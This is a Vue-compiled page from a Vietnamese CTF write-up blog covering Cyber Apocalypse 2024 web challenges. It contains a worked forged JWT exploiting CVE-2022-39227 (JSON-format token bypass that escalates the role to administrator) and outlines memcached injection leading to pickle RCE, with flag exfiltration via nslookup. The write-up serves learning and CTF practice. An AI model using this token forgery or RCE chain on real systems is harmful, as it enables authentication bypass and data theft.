      _cache[22] || (_cache[22] = createTextVNode(" ·ªû phi√™n b·∫£n c≈©, ta c√≥ th·ªÉ ƒë∆∞a v√†o JSON string thay v√¨ JWT string format, d·∫´n ƒë·∫øn vi·ªác gi·∫£ m·∫°o d·ªØ li·ªáu m√† v·∫´n c√≥ th·ªÉ verify th√†nh c√¥ng."))
    ]),
    _cache[33] || (_cache[33] = createStaticVNode('<p>Khi GET <code>/api/v1/flag</code> c√πng jwt, app s·∫Ω g·ªçi h√†m verify jwt ƒë∆∞·ª£c truy·ªÅn v√†o</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py" data-title="py"><pre><code><span class="line"><span class="token keyword">def</span> <span class="token function">verify_jwt</span><span class="token punctuation">(</span>jwt<span class="token punctuation">,</span> <span class="token comment">#jwt</span></span>\n<span class="line">               pub_key<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token comment">#current_app.config.get(&#39;JWT_SECRET_KEY&#39;)</span></span>\n<span class="line">               allowed_algs<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token comment"># [&#39;PS256&#39;]</span></span>\n<span class="line">               iat_skew<span class="token operator">=</span>timedelta<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span></span>\n<span class="line">               checks_optional<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span></span>\n<span class="line">               ignore_not_implemented<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>\n<span class="line">    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span>\n<span class="line">    header<span class="token punctuation">,</span> claims<span class="token punctuation">,</span> _ <span class="token operator">=</span> jwt<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&#39;.&#39;</span><span class="token punctuation">)</span></span>\n<span class="line">    parsed_header <span class="token operator">=</span> json_decode<span class="token punctuation">(</span>base64url_decode<span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token punctuation">)</span></span>\n<span class="line">    </span>\n<span class="line">    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span>\n<span class="line">    <span class="token keyword">if</span> pub_key<span class="token punctuation">:</span></span>\n<span class="line">        token <span class="token operator">=</span> JWS<span class="token punctuation">(</span><span class="token punctuation">)</span></span>\n<span class="line">        token<span class="token punctuation">.</span>allowed_algs <span class="token operator">=</span> allowed_algs</span>\n<span class="line">        token<span class="token punctuation">.</span>deserialize<span class="token punctuation">(</span>jwt<span class="token punctuation">,</span> pub_key<span class="token punctuation">)</span></span>\n<span class="line">    <span class="token keyword">elif</span> <span class="token string">&#39;none&#39;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> allowed_algs<span class="token punctuation">:</span></span>\n<span class="line">        <span class="token keyword">raise</span> _JWTError<span class="token punctuation">(</span><span class="token string">&#39;no key but none alg not allowed&#39;</span><span class="token punctuation">)</span></span>\n<span class="line"></span>\n<span class="line">    parsed_claims <span class="token operator">=</span> json_decode<span class="token punctuation">(</span>base64url_decode<span class="token punctuation">(</span>claims<span class="token punctuation">)</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span>\n<span class="line">    <span class="token keyword">return</span> parsed_header<span class="token punctuation">,</span> parsed_claims</span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Code t√°ch jwt ƒë∆∞·ª£c truy·ªÅn v√†o theo k√≠ t·ª± <code>.</code> th√†nh 3 ph·∫ßn. V·ªõi ph·∫ßn t·ª≠ ƒë·∫ßu ti√™n l√† <code>header</code>, th·ª© hai l√† <code>claims</code> (payload) v√† signature kh√¥ng s·ª≠ d·ª•ng ƒë·∫øn. Sau ƒë√≥ g·ªçi <code>token.deserialize</code> ƒë·ªÉ deserialize jwt, n·∫øu c√≥ l·ªói g√¨ v·ªõi jwt th√¨ raise error, ng∆∞·ª£c l·∫°i th√¨ tr·∫£ v·ªÅ 2 dict ƒë∆∞·ª£c loads sau khi decode base64.</p><p>Trace v√†o h√†m <code>deserialize</code>, ta th·∫•y <code>raw_jws</code> ban ƒë·∫ßu ƒë∆∞·ª£c xem l√† JSON string, app c·ªë g·∫Øng ƒë·ªÉ loads JSON t·ª´ <code>raw_jns</code>. N·∫øu kh√¥ng ƒë∆∞·ª£c th√¨ m·ªõi xem ƒë√≥ l√† JWT format v√† split theo k√≠ t·ª± <code>.</code> N·∫øu ƒë∆∞a v√†o JWT ƒë√£ b·ªã thay ƒë·ªïi theo jwt format th√¨ s·∫Ω verify th·∫•t b·∫°i, ta c·∫ßn th·ª≠ ƒë∆∞a v√†o jwt d∆∞·ªõi d·∫°ng JSON string.</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py" data-title="py"><pre><code><span class="line">    <span class="token keyword">def</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raw_jws<span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> alg<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>\n<span class="line">        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span>\n<span class="line">        <span class="token keyword">try</span><span class="token punctuation">:</span></span>\n<span class="line">            <span class="token keyword">try</span><span class="token punctuation">:</span></span>\n<span class="line">                djws <span class="token operator">=</span> json_decode<span class="token punctuation">(</span>raw_jws<span class="token punctuation">)</span></span>\n<span class="line">                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span>\n<span class="line">            <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span></span>\n<span class="line">                data <span class="token operator">=</span> raw_jws<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&#39;.&#39;</span><span class="token punctuation">)</span></span>\n<span class="line">                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span>\n<span class="line">        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>  <span class="token comment"># pylint: disable=broad-except</span></span>\n<span class="line">            <span class="token keyword">raise</span> InvalidJWSObject<span class="token punctuation">(</span><span class="token string">&#39;Invalid format&#39;</span><span class="token punctuation">)</span> <span class="token keyword">from</span> e</span>\n<span class="line"></span>\n<span class="line">        <span class="token keyword">if</span> key<span class="token punctuation">:</span></span>\n<span class="line">            self<span class="token punctuation">.</span>verify<span class="token punctuation">(</span>key<span class="token punctuation">,</span> alg<span class="token punctuation">)</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>T·∫≠p trung v√†o tr∆∞·ªùng h·ª£p <code>json_decode</code> th√†nh c√¥ng. Code s·∫Ω l·∫•y payload (claims), signature, protected (header) t·ª´ <code>djws</code> v√† ti·∫øn h√†nh verify. <img src="' + _imports_4 + '" alt="image"> Ta c·∫ßn ƒë∆∞a v√†o jwt th·ªèa m√£n:</p><ul><li>L√† d·∫°ng JSON string</li><li>Sau khi split k√≠ t·ª± &#39;.&#39; chia ra 3 ph·∫ßn: header, payload v√† _ (KH√îNG QUAN TR·ªåNG üí£üí•üí•)</li></ul><p>V√¨ h√†m <code>verify_jwt</code> ch·ªâ return v·ªÅ 2 ph·∫ßn ƒë·∫ßu, v√† h√†m <code>desrialize</code> d·ª±a v√†o dict keys (protected, payload, signature,...) ƒë·ªÉ d·ª±ng l·∫°i jwt token v√† verify --&gt; C√≥ th·ªÉ fake 2 ph·∫ßn ƒë·∫ßu l√† 2 ph·∫ßn ƒë√£ b·ªã thay ƒë·ªïi, v√† jwt token ƒë∆∞·ª£c verify l√† jwt token c≈©.</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json" data-title="json"><pre><code><span class="line"><span class="token punctuation">{</span></span>\n<span class="line">  <span class="token property">&quot;header.new_payload.hehe&quot;</span><span class="token operator">:</span><span class="token string">&quot;huhu&quot;</span><span class="token punctuation">,</span></span>\n<span class="line">  <span class="token property">&quot;protected&quot;</span><span class="token operator">:</span> header<span class="token punctuation">,</span></span>\n<span class="line">  <span class="token property">&quot;payload&quot;</span><span class="token operator">:</span> original_payload<span class="token punctuation">,</span></span>\n<span class="line">  <span class="token property">&quot;signature&quot;</span><span class="token operator">:</span> signature</span>\n<span class="line"><span class="token punctuation">}</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>T·ª´ payload n√†y, C√≥ th·ªÉ th·∫•y jwt ƒë∆∞a v√†o <code>app/v1/flag</code> th·ªèa m√£n c·∫£ hai ƒëi·ªÅu ki·ªán tr√™n.</p><p>C·ª• th·ªÉ v·ªõi jwt l√†</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA5OTQ4MTAsImlhdCI6MTcxMDk5MTIxMCwianRpIjoiMkt1NkN5cUZrLTdjSXBsV1FDNzVzZyIsIm5iZiI6MTcxMDk5MTIxMCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.TDMdUJYNSqpVxZKFLAD9vZnYco4i-h9rC5RZIQd9eO4KhsXt_K6L1iVidAAmMUOh8ZT8TMgLVqHfWWG4ymqeC-FGEAR4yNzwHP5IyvrOMVxYWboiR0vbxf-dREMZ5ikKATdNhENEyA7MoQq_alyU5H6csxJKmV9kchJviyB58OQ06BL7XhVC4vkOkiHZP_4N5xs_CQm3Za7mVwGiNrv35R4qlX3FJB2UseDpu-kzga1AtgKhat_zSthDBIlXQUmyZFk6sd8FyzHNKTm_pR2JYaebyutmDvIdhOgiNK0hYTjuamBBEeWMMX49k4pbe33Vrrh-oyF58SkCB2fCUhnq-Q</span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>S·∫Ω th√†nh</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json" data-title="json"><pre><code><span class="line"><span class="token punctuation">{</span></span>\n<span class="line">  <span class="token property">&quot;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOiAxNzEwOTk0ODEwLCAiaWF0IjogMTcxMDk5MTIxMCwgImp0aSI6ICIyS3U2Q3lxRmstN2NJcGxXUUM3NXNnIiwgIm5iZiI6IDE3MTA5OTEyMTAsICJyb2xlIjogImFkbWluaXN0cmF0b3IiLCAidXNlciI6ICJndWVzdF91c2VyIn0.hehe&quot;</span><span class="token operator">:</span> <span class="token string">&quot;huhu&quot;</span><span class="token punctuation">,</span></span>\n<span class="line">  <span class="token property">&quot;protected&quot;</span><span class="token operator">:</span><span class="token string">&quot;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9&quot;</span><span class="token punctuation">,</span></span>\n<span class="line">  <span class="token property">&quot;payload&quot;</span><span class="token operator">:</span><span class="token string">&quot;eyJleHAiOjE3MTA5OTQ4MTAsImlhdCI6MTcxMDk5MTIxMCwianRpIjoiMkt1NkN5cUZrLTdjSXBsV1FDNzVzZyIsIm5iZiI6MTcxMDk5MTIxMCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ&quot;</span><span class="token punctuation">,</span></span>\n<span class="line">  <span class="token property">&quot;signature&quot;</span><span class="token operator">:</span><span class="token string">&quot;TDMdUJYNSqpVxZKFLAD9vZnYco4i-h9rC5RZIQd9eO4KhsXt_K6L1iVidAAmMUOh8ZT8TMgLVqHfWWG4ymqeC-FGEAR4yNzwHP5IyvrOMVxYWboiR0vbxf-dREMZ5ikKATdNhENEyA7MoQq_alyU5H6csxJKmV9kchJviyB58OQ06BL7XhVC4vkOkiHZP_4N5xs_CQm3Za7mVwGiNrv35R4qlX3FJB2UseDpu-kzga1AtgKhat_zSthDBIlXQUmyZFk6sd8FyzHNKTm_pR2JYaebyutmDvIdhOgiNK0hYTjuamBBEeWMMX49k4pbe33Vrrh-oyF58SkCB2fCUhnq-Q&quot;</span></span>\n<span class="line"><span class="token punctuation">}</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Sau khi split, header s·∫Ω l√† <code>{&quot;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9</code> nh∆∞ng v·∫´n c√≥ th·ªÉ decode v√† loads th√†nh c√¥ng <img src="' + _imports_5 + '" alt="image"></p><p>Sau ƒë√≥ jwt ƒë∆∞·ª£c deserilize v√† verify <img src="' + _imports_6 + '" alt="image"> Cu·ªëi c√πng jwt ƒë∆∞·ª£c verify qua JWSCore, v√¨ param <code>header</code> ƒë∆∞·ª£c truy·ªÅn v√†o t·ª´ <code>protected</code> n√™n khi t·∫°o JSONG string, m√¨nh ph·∫£i d√πng <code>protected</code>. <img src="' + _imports_7 + '" alt="image"></p><hr>', 17)),
    createBaseVNode("p", null, [
      _cache[24] || (_cache[24] = createTextVNode("B√†i vi·∫øt tham kh·∫£o th√™m t·ª´ ")),
      createBaseVNode("a", _hoisted_9, [
        _cache[23] || (_cache[23] = createTextVNode("@user0x1337/CVE-2022-39227")),
        createVNode(_component_ExternalLinkIcon)
      ])
    ]),
    _cache[34] || (_cache[34] = createStaticVNode('<h2 id="web-serialflow" tabindex="-1"><a class="header-anchor" href="#web-serialflow"><span>WEB: SerialFlow</span></a></h2><div class="custom-container info"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">Challenge</p><p>SerialFlow is the main global network used by KORP, you have managed to reach a root server web interface by traversing KORP&#39;s external proxy network. Can you break into the root server and open pandoras box by revealing the truth behind KORP?</p><p><a href="#"><code>üìÅ web_serialflow.zip</code></a></p></div><p>Khi v√†o web ta s·∫Ω th·∫•y m·ªôt giao di·ªán kh√° ng·∫ßu <img src="' + _imports_8 + '" alt="alt text"> Ta c√≥ th·ªÉ ch·ªânh s·ª≠a m√†u c·ªßa text khi GET <code>/set?uicolor=(color)</code> v·ªõi color l√† m√†u t√πy ch·ªânh. Ng√≥ qua <code>requirements.txt</code> c√≥ th·ªÉ th·∫•y code s·ª≠ d·ª•ng Flask, Flask-Session v√† pylibmc (memcached)</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">Flask==2.2.2</span>\n<span class="line">Flask-Session==0.4.0</span>\n<span class="line">pylibmc==1.6.3</span>\n<span class="line">Werkzeug==2.2.2</span>\n<span class="line">debugpy</span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>', 4)),
    createBaseVNode("p", null, [
      _cache[26] || (_cache[26] = createTextVNode("Code s·ª≠ d·ª•ng memcache l√†m cache server ƒë·ªÉ l∆∞u data. C√≥ m·ªôt ")),
      createBaseVNode("a", _hoisted_10, [
        _cache[25] || (_cache[25] = createTextVNode("blog")),
        createVNode(_component_ExternalLinkIcon)
      ]),
      _cache[27] || (_cache[27] = createTextVNode(" kh√° th√∫ v·ªã n√≥i v·ªÅ memcached injection to RCE d·ª±a v√†o Pickle deserialize (unpickle)."))
    ]),
    _cache[35] || (_cache[35] = createStaticVNode('<p>Pickle s·∫Ω load val t·ª´ memcached server, v·ªõi <code>full_session_key</code> c√≥ sid l√† m√¨nh c√≥ th·ªÉ t√πy ch·ªânh <img src="' + _imports_9 + '" alt="alt text"> Theo blog th√¨ ta c√≥ th·ªÉ s·ª≠ d·ª•ng memcached injection ƒë·ªÉ th√™m v√†o memcached server data c·ªßa m√¨nh.</p><p><img src="' + _imports_10 + '" alt="alt text"> Khi ƒë∆∞a v√†o cookie v√† reload page, nh·ªù memcache injection, ta ƒë√£ ƒë∆∞a v√†o d·ªØ li·ªáu c·ªßa m√¨nh nh∆∞ sau <img src="' + _imports_11 + '" alt="alt text"> Khi pickle loads <code>hehe</code>, h√†m <code>os.system</code> s·∫Ω ƒë∆∞·ª£c ch·∫°y v√† t·∫°o m·ªôt file <code>huhu.txt</code> ·ªü temp folders. Nh∆∞ v·∫≠y l√† RCE th√†nh c√¥ng, t·ª´ ƒë√¢y ta c√≥ th·ªÉ ƒë·ªçc file flag v√† send ƒë·∫øn server c·ªßa m√¨nh qua dns v·ªõi l·ªánh <code>nslookup</code>.</p><h1 id="" tabindex="-1"><a class="header-anchor" href="#"><span></span></a></h1><p><s><em>Update later</em></s></p>', 4))
  ]);
}
const cyberApocalypse2024_html = /* @__PURE__ */ _export_sfc(_sfc_main, [["render", _sfc_render], ["__file", "cyber-apocalypse-2024.html.vue"]]);
const data = JSON.parse('{"path":"/blogs/CTF/2024/cyber-apocalypse-2024.html","title":"Cyber Apocalypse CTF 2024","lang":"en-US","frontmatter":{"title":"Cyber Apocalypse CTF 2024","date":"2024-03-20T00:00:00.000Z","tags":["JWT","Pathtraversal"],"categories":["CTF"]},"headers":[{"level":2,"title":"WEB: testimonial","slug":"web-testimonial","link":"#web-testimonial","children":[]},{"level":2,"title":"WEB: Locktalk","slug":"web-locktalk","link":"#web-locktalk","children":[{"level":3,"title":"V·ªÅ CVE-2022-39227","slug":"ve-cve-2022-39227","link":"#ve-cve-2022-39227","children":[]}]},{"level":2,"title":"WEB: SerialFlow","slug":"web-serialflow","link":"#web-serialflow","children":[]}],"git":{"createdTime":1734340044000,"updatedTime":1734340044000,"contributors":[{"name":"Phan Nguyen Huy Duy","email":"pnhd.dyh@gmail.com","commits":1}]},"filePathRelative":"blogs/CTF/2024/cyber-apocalypse-2024.md"}');
export {
  cyberApocalypse2024_html as comp,
  data
};
